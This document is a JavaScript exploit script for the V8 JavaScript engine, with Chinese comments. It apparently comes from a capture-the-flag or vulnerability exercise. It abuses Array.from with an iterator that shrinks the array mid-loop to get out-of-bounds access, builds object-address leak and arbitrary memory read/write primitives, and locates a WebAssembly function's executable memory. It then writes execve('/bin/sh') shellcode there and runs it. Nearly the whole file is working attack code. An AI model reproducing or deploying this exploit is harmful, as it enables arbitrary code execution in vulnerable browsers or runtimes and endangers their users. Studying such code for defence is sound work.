class Memory{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    d2u(val){       //double ==> Uint64
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2d(val){       //Uint64 ==> double
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}
function hex(x)                             //打印16进制
{
   return '0x' + (x.toString(16)).padStart(16, 0);
}

var mem = new Memory();
var bufs = [];
var objs = [];
var oobArray = [1.1];
var maxSize = 1028 * 8;

Array.from.call(function() { return oobArray; }, {[Symbol.iterator] : _ => (
    {
        counter : 0,
        next() {
            let result = 1.1;
            this.counter++;
            if (this.counter > maxSize) {
                oobArray.length = 1;
                for (let i = 0;i < 100;i++) {
                    bufs.push(new ArrayBuffer(0x1234));
                    let obj = {'a': 0x4321, 'b': 0x9999};
                    objs.push(obj);
                }
                return {done: true};
            } else {
                return {value: result, done: false};
            }
        }
    }
)});
// 可控的buf在oobArray的第i个元素处
let buf_offset = 0;
for(let i = 0; i < maxSize; i++){
    let val = mem.d2u(oobArray[i]);
    if(val === 0x123400000000){
        console.log("buf_offset: " + i.toString());
        buf_offset = i;
        oobArray[i] = mem.u2d(0x121200000000);  //修改可控buf的length，做个标记
        oobArray[i + 3] = mem.u2d(0x1212);      //有两处保存了length值
        break;
    }
}

// 可控的obj在oobArray的第i个元素处
let obj_offset = 0
for(let i = 0; i < maxSize; i++){
    let val = mem.d2u(oobArray[i]);
    if(val === 0x432100000000){
        console.log("obj_offset: " + i.toString());
        obj_offset = i;
        oobArray[i] = mem.u2d(0x567800000000);  //修改可控obj的属性a，做个标记
        break;
    }
}
// bufs中的第i个buf是可控的
let controllable_buf_idx = 0;
for(let i = 0; i < bufs.length; i++){
    let val = bufs[i].byteLength;
    if(val === 0x1212){                         //查找被修改了length的buf
        console.log("found controllable buf at idx " + i.toString());
        controllable_buf_idx = i;
        break;
    }
}

// objs中第i个obj是可控的
let controllable_obj_idx = 0;
for(let i = 0; i < objs.length; i++){
    let val = objs[i].a;
    if(val === 0x5678){                         //查找属性a被修改了的obj
        console.log("found controllable obj at idx " + i.toString());
        controllable_obj_idx = i;
        break;
    }
}
class arbitraryRW{
    constructor(buf_offset, buf_idx, obj_offset, obj_idx){
        this.buf_offset = buf_offset;
        this.buf_idx = buf_idx;
        this.obj_offset = obj_offset;
        this.obj_idx = obj_idx;
    }
    leak_obj(obj){
        objs[this.obj_idx].a = obj;                     //修改obj.a的值为目标对象
        return mem.d2u(oobArray[this.obj_offset]) - 1;  //读出属性a的值，因为oobArray是以double的格式读出，所以需要转换为Uint64
    }
    read(addr){                 
        let idx = this.buf_offset;
        oobArray[idx + 1] = mem.u2d(addr);              //修改BackingStore指针指向目标地址
        //oobArray[idx + 2] = mem.u2d(addr);              //修改BitField指针指向目标地址（因为调试发现该值总和BackingStore相同）
        let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10);
        return mem.d2u(tmp[0]);
    }
    write(addr, val){
        let idx = this.buf_offset;
        oobArray[idx + 1] = mem.u2d(addr);
        //oobArray[idx + 2] = mem.u2d(addr);
        let tmp = new Uint8Array(bufs[this.buf_idx], 0, 0x10)
        tmp[0] = val;                     //将欲存储的Uint64值转为double形式写入
    }
}
var arw = new arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,
    127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,
    1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,
    0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,10,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
let leak_f = arw.leak_obj(f);
let share_info = arw.read(leak_f+0x18)-1;
let code = arw.read(share_info+0x8)-1;
let rwx_addr = arw.read(code+0x72);

//console.log(hex(rwx_addr));
//%DebugPrint(bufs[controllable_buf_idx]);
/*for (let i = 0; i < shellcode.length; i++) {
    arw.write(rwx_addr+8*i, shellcode[i]);
}*/
shellcode= [106,0,72,141,61,17,0,0,0,87,72,141,52,36,72,49,210,72,199,192,59,0,0,0,15,5,47,98,105,110,47,115,104,0];
for(var i = 0; i < shellcode.length;i++){
    var value = shellcode[i];       
    arw.write(rwx_addr+i,value);
}
f();

/*let shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x48\x31\xc0\xb0\x3b\x99\x4d\x31\xd2\x0f\x05";
for(var i = 0; i < shellcode.length;i++){
    var value = shellcode[i];       
    arw.write(rwx_addr+i,value.charCodeAt());
}*/